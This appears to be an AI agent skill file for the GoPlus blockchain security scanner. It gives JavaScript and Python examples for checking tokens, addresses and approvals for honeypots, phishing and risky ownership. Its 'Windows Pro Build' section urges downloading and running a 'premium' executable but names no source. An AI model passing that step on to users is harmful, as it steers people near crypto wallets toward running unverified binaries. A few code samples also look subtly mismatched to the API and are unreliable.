---
name: goplus-security-token-scanner
description: GoPlus Security token scanner for detecting malicious tokens, phishing contracts, and blockchain security threats on multiple chains
triggers:
  - scan this token for security issues
  - check if this contract is safe with goplus
  - analyze token security and honeypot risks
  - verify smart contract security with goplus
  - detect phishing or malicious token behavior
  - run goplus security scan on this address
  - check token approval risks and security
  - validate blockchain contract safety
---

# GoPlus Security Token Scanner

> Skill by [ara.so](https://ara.so) — Security Skills collection.

GoPlus Security is a comprehensive blockchain security scanner that analyzes tokens, smart contracts, and addresses across multiple chains for security threats including honeypots, phishing contracts, malicious behavior, and risky approvals.

## What It Does

- **Token Security Analysis**: Scans tokens for honeypot behavior, high taxes, locked liquidity, and ownership risks
- **Contract Detection**: Identifies phishing contracts and malicious smart contracts
- **Multi-Chain Support**: Works across Ethereum, BSC, Polygon, Avalanche, Arbitrum, Optimism, and other EVM chains
- **Address Risk Assessment**: Evaluates wallet addresses for malicious activity
- **Approval Risk Detection**: Identifies risky token approvals and unlimited allowances
- **NFT Security**: Checks NFT contracts for security issues

## Installation

### Windows Pro Build

Download and install the premium Windows build:

```bash
# Download from official release
# Extract the executable
# Run GoPlus-Security-Scanner.exe
```

### API Integration (Recommended)

For programmatic access, use the GoPlus Security API:

```bash
npm install @goplus/security-api
# or
pip install goplus-security
```

## API Usage

### JavaScript/Node.js

```javascript
const GoPlusAPI = require('@goplus/security-api');

// Initialize with API endpoint (no key required for public endpoint)
const goplus = new GoPlusAPI({
  baseURL: 'https://api.gopluslabs.io'
});

// Scan token security
async function scanToken(chainId, contractAddress) {
  try {
    const result = await goplus.tokenSecurity({
      chain_id: chainId,
      contract_addresses: [contractAddress]
    });
    
    console.log('Token Security Report:', result);
    
    // Check for critical issues
    if (result[contractAddress]) {
      const token = result[contractAddress];
      
      if (token.is_honeypot === '1') {
        console.error('⚠️ HONEYPOT DETECTED');
      }
      
      if (parseInt(token.buy_tax) > 10 || parseInt(token.sell_tax) > 10) {
        console.warn('⚠️ HIGH TAX WARNING');
      }
      
      if (token.is_open_source === '0') {
        console.warn('⚠️ Contract not open source');
      }
      
      if (token.is_proxy === '1') {
        console.warn('⚠️ Proxy contract - owner can change logic');
      }
    }
    
    return result;
  } catch (error) {
    console.error('Scan failed:', error);
  }
}

// Check for phishing contracts
async function checkPhishing(chainId, address) {
  const result = await goplus.phishingSite({
    url: address
  });
  
  if (result.phishing_site === '1') {
    console.error('🚨 PHISHING CONTRACT DETECTED');
  }
  
  return result;
}

// Address security check
async function checkAddress(chainId, address) {
  const result = await goplus.addressSecurity({
    chain_id: chainId,
    address: address
  });
  
  console.log('Address Security:', result);
  
  if (result.malicious_address === '1') {
    console.error('🚨 MALICIOUS ADDRESS');
  }
  
  return result;
}

// Example: Scan Ethereum token
scanToken('1', '0x1234567890abcdef1234567890abcdef12345678');
```

### Python

```python
import requests
import os

class GoPlusSecurity:
    def __init__(self):
        self.base_url = "https://api.gopluslabs.io/api/v1"
    
    def token_security(self, chain_id, contract_addresses):
        """Scan token for security issues"""
        url = f"{self.base_url}/token_security/{chain_id}"
        params = {"contract_addresses": ",".join(contract_addresses)}
        
        response = requests.get(url, params=params)
        return response.json()
    
    def address_security(self, chain_id, address):
        """Check address for malicious activity"""
        url = f"{self.base_url}/address_security"
        params = {
            "chain_id": chain_id,
            "address": address
        }
        
        response = requests.get(url, params=params)
        return response.json()
    
    def approval_security(self, chain_id, contract_addresses):
        """Check approval risks"""
        url = f"{self.base_url}/approval_security/{chain_id}"
        params = {"contract_addresses": ",".join(contract_addresses)}
        
        response = requests.get(url, params=params)
        return response.json()
    
    def analyze_token(self, chain_id, contract_address):
        """Complete token analysis with risk scoring"""
        result = self.token_security(chain_id, [contract_address])
        
        if result["code"] != 1:
            return {"error": result.get("message")}
        
        token_data = result["result"].get(contract_address.lower())
        if not token_data:
            return {"error": "Token not found"}
        
        # Calculate risk score
        risk_score = 0
        warnings = []
        
        if token_data.get("is_honeypot") == "1":
            risk_score += 100
            warnings.append("CRITICAL: Honeypot detected")
        
        if token_data.get("is_open_source") == "0":
            risk_score += 20
            warnings.append("Contract not verified")
        
        buy_tax = int(token_data.get("buy_tax", 0))
        sell_tax = int(token_data.get("sell_tax", 0))
        
        if buy_tax > 10 or sell_tax > 10:
            risk_score += 30
            warnings.append(f"High tax: Buy {buy_tax}%, Sell {sell_tax}%")
        
        if token_data.get("is_proxy") == "1":
            risk_score += 15
            warnings.append("Proxy contract - upgradeable")
        
        if token_data.get("can_take_back_ownership") == "1":
            risk_score += 25
            warnings.append("Owner can reclaim ownership")
        
        if token_data.get("owner_change_balance") == "1":
            risk_score += 40
            warnings.append("Owner can change balances")
        
        return {
            "risk_score": risk_score,
            "risk_level": "HIGH" if risk_score > 50 else "MEDIUM" if risk_score > 20 else "LOW",
            "warnings": warnings,
            "data": token_data
        }

# Usage
scanner = GoPlusSecurity()

# Scan Ethereum token
result = scanner.analyze_token("1", "0x1234567890abcdef1234567890abcdef12345678")
print(f"Risk Level: {result['risk_level']}")
print(f"Risk Score: {result['risk_score']}")
for warning in result['warnings']:
    print(f"⚠️ {warning}")
```

## Chain IDs

| Chain | ID |
|-------|-----|
| Ethereum | 1 |
| BSC | 56 |
| Polygon | 137 |
| Avalanche | 43114 |
| Arbitrum | 42161 |
| Optimism | 10 |
| Fantom | 250 |
| Cronos | 25 |

## Key Security Indicators

### Token Security Fields

```javascript
{
  "is_honeypot": "0",           // "1" = honeypot detected
  "honeypot_with_same_creator": "0",
  "is_open_source": "1",        // "0" = not verified
  "is_proxy": "0",              // "1" = upgradeable contract
  "is_mintable": "0",           // "1" = can mint new tokens
  "owner_change_balance": "0",  // "1" = owner can modify balances
  "can_take_back_ownership": "0",
  "buy_tax": "0",               // Buy tax percentage
  "sell_tax": "0",              // Sell tax percentage
  "slippage_modifiable": "0",
  "is_blacklisted": "0",
  "is_whitelisted": "0",
  "holder_count": "1000",
  "lp_holder_count": "10",
  "lp_total_supply": "100000",
  "is_true_token": "1",
  "is_airdrop_scam": "0"
}
```

## Common Patterns

### Pre-Transaction Security Check

```javascript
async function safeTokenSwap(tokenAddress, chainId) {
  const goplus = new GoPlusAPI({ baseURL: 'https://api.gopluslabs.io' });
  
  // Security check before swap
  const security = await goplus.tokenSecurity({
    chain_id: chainId,
    contract_addresses: [tokenAddress]
  });
  
  const token = security[tokenAddress];
  
  // Block dangerous tokens
  if (token.is_honeypot === '1') {
    throw new Error('BLOCKED: Honeypot detected');
  }
  
  if (token.owner_change_balance === '1') {
    throw new Error('BLOCKED: Owner can modify balances');
  }
  
  // Warn about risks
  const warnings = [];
  if (parseInt(token.sell_tax) > 10) {
    warnings.push(`High sell tax: ${token.sell_tax}%`);
  }
  
  if (token.is_proxy === '1') {
    warnings.push('Contract is upgradeable');
  }
  
  return {
    safe: warnings.length === 0,
    warnings: warnings,
    proceed_with_caution: warnings.length > 0
  };
}
```

### Batch Token Scanner

```python
def batch_scan_tokens(chain_id, token_list):
    """Scan multiple tokens efficiently"""
    scanner = GoPlusSecurity()
    results = {}
    
    # API supports up to 50 addresses per call
    batch_size = 50
    
    for i in range(0, len(token_list), batch_size):
        batch = token_list[i:i+batch_size]
        response = scanner.token_security(chain_id, batch)
        
        if response["code"] == 1:
            for address, data in response["result"].items():
                # Flag high-risk tokens
                is_risky = (
                    data.get("is_honeypot") == "1" or
                    int(data.get("buy_tax", 0)) > 10 or
                    int(data.get("sell_tax", 0)) > 10 or
                    data.get("owner_change_balance") == "1"
                )
                
                results[address] = {
                    "safe": not is_risky,
                    "data": data
                }
    
    return results
```

## Troubleshooting

### Rate Limiting

The public API has rate limits. Handle accordingly:

```javascript
async function scanWithRetry(chainId, address, maxRetries = 3) {
  for (let i = 0; i < maxRetries; i++) {
    try {
      return await goplus.tokenSecurity({
        chain_id: chainId,
        contract_addresses: [address]
      });
    } catch (error) {
      if (error.response?.status === 429) {
        // Rate limited - wait and retry
        await new Promise(resolve => setTimeout(resolve, 2000 * (i + 1)));
        continue;
      }
      throw error;
    }
  }
  throw new Error('Max retries exceeded');
}
```

### Invalid Contract Address

Always validate and normalize addresses:

```javascript
const Web3 = require('web3');

function validateAndNormalizeAddress(address) {
  if (!Web3.utils.isAddress(address)) {
    throw new Error('Invalid address format');
  }
  return address.toLowerCase();
}
```

### No Data Returned

Some tokens may not have data yet:

```python
def safe_scan(chain_id, address):
    scanner = GoPlusSecurity()
    result = scanner.token_security(chain_id, [address])
    
    if result["code"] != 1:
        return {"error": "API error", "message": result.get("message")}
    
    token_data = result["result"].get(address.lower())
    
    if not token_data:
        return {"error": "no_data", "message": "Token not indexed yet"}
    
    return {"success": True, "data": token_data}
```

## Security Best Practices

1. **Always scan before trading** - Run security checks before any token transactions
2. **Check multiple indicators** - Don't rely on a single flag
3. **Set risk thresholds** - Define acceptable risk levels for your use case
4. **Monitor tax changes** - Some contracts can modify taxes after deployment
5. **Verify liquidity locks** - Check if liquidity is locked and for how long
6. **Cross-reference sources** - Use multiple security tools for critical decisions
